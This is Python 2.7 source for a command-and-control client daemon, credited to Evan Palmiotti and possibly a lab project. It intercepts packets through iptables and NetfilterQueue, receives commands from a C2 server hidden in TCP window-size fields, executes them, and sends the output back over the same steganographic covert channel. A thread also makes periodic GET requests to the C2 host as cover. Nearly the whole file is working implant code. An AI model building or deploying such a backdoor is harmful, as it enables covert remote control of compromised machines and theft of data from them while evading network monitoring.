#!/usr/bin/env python2.7
#
# @desc This is the client daemon. It will be run in the background and intercept incoming traffic from 
# the C2 server. The script will read and execute any command coming through the C2 channel. Finally, 
# the output of executed commands will be sent via the covert channel to the C2 server.
#
# @author Evan Palmiotti
# @required scapy, requests, time, netfilterqueue, threading, steghelper.py
########################################################################################################

from scapy.all import *
import requests
import time
from netfilterqueue import NetfilterQueue
import threading
from steghelper import *

dst='172.16.226.133' # Change this as needed to reflect C2 server (can be a host name)
QUEUE=1              # The IPTABLES Queue to send intercepted traffic to
IFACE='vmnet8'       # interface to send and recieve on
R_ARRAY=''           # Array to store recieved data
ENDCHAR=65535        # Character to notate the begging and end of a message 
                     # (this MUST be the same value for server and client)
ISREADING=False      # Boolean value to tell if a message is incoming
M_ARRAY=[]           # Array to store the message to send
M_INDEX=0            # Current processing index in the message array
REQFREQ=0.2          # Amonut of time to wait between GET requests (0 means no requests will be made)

#
# @desc categorizes packets into incoming or outgoing and calls their respective handling functions
# @param packet - the raw packet intercepted
# @return none
#
def categorizer(packet):
    spacket = IP(packet.get_payload())
    if spacket.src == dst:
        reader(packet, spacket)
    else:
        injector(packet, spacket) 

# 
# @desc reads an incoming packet and stores any relevant data from the TCP window length header
# @param packet - the raw packet to be accepted as normal traffic
# @param spacket - the scapy packet to be analyzed for data
# @return none
#
def reader(packet, spacket):
    global ENDCHAR, R_ARRAY, ISREADING
    msg = spacket['TCP'].window
   

    if msg == ENDCHAR:
        if not ISREADING:
            print("Now Reading")
            ISREADING=True
        else:
            print("###### RECIEVED WHOLE MESSAGE: "+R_ARRAY)
            M_ARRAY.extend(handleMessage(R_ARRAY, ENDCHAR))
            R_ARRAY=''
            ISREADING=False

    elif ISREADING:
        msg = '{:04x}'.format(msg)
        if '00' in msg:
            msg = msg[2::]
        msg = msg.decode('hex')
        R_ARRAY+=msg
    
    packet.accept()

#
# @desc injects data into outgoing packets if a message needs to be sent
# @param packet - original raw packet
# @param spacket - original scapy packet
# @return none
#
def injector(packet, spacket):
    #print(spacket['TCP'].payload)

    global M_ARRAY, M_INDEX

    
    if M_INDEX < len(M_ARRAY):
        #print('sending')
        msg = M_ARRAY[M_INDEX]
        M_INDEX+=1

        newpkt = IP(dst=spacket.dst,
                src=spacket.src)/TCP(sport=spacket['TCP'].sport,
                        dport=spacket['TCP'].dport,
                        seq=spacket['TCP'].seq,
                        ack=spacket['TCP'].ack,
                        flags=spacket['TCP'].flags,
                        window=msg)/spacket['TCP'].payload
    
        payload = bytes(newpkt)
        packet.set_payload(payload)
        if M_INDEX >= len(M_ARRAY):
            print('done')
            M_INDEX=0
            M_ARRAY=[]
    packet.accept()

#
# @desc extracts all packets from the queue filled by the iptables rules created in steghelper.py
# @return none
#
def interceptor():
    print("intercepting...\n")
    nfqueue = NetfilterQueue()
    nfqueue.bind(QUEUE, categorizer)
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        pass

#
# @desc periodically makes GET requests to the webservice hosted by the C2 server
# @return none
#
def requestor():
    if REQFREQ == 0:
        return
    while 1:
        time.sleep(REQFREQ)
        r=requests.get('http://'+dst)

#
# @main
# @desc creates iptable rules, starts up the requestor function as a thread, start interceptor loop
# @return none
#
def main():
    ipstat(IFACE)
     
    handleIptables(dst, QUEUE)

    b = threading.Thread(name='requestor', target=requestor)
    b.daemon = True
    b.start()
    
    interceptor()

if __name__ == "__main__":
    main()
